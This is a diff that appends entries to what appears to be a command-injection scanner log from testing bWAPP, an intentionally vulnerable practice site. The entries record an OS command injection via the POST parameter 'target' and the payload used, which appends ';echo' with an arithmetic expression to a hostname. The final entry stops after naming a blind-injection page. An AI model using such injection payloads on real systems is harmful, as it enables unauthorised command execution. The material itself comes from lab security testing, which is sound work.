@@ -55,3 +55,17 @@
 [info] Technique: Classic Command Injection Technique
 [info] Parameter: (POST) target
 [info] Used payload: www.nsa.gov;echo QXVTXM$((76%2B25))$(echo QXVTXM)QXVTXM
+
+=====================================
+| Started in 12/10/2023 at 16:36:10 |
+=====================================
+[info] Tested URL : https://bwapp.hakhub.net/commandi.php
+[info] Type: Results-Based Os Command Injection
+[info] Technique: Classic Command Injection Technique
+[info] Parameter: (POST) target
+[info] Used payload: www.nsa.gov;echo QXVTXM$((76%2B25))$(echo QXVTXM)QXVTXM
+
+=====================================
+| Started in 12/10/2023 at 16:39:59 |
+=====================================
+[info] Tested URL : https://bwapp.hakhub.net/commandi_blind.php
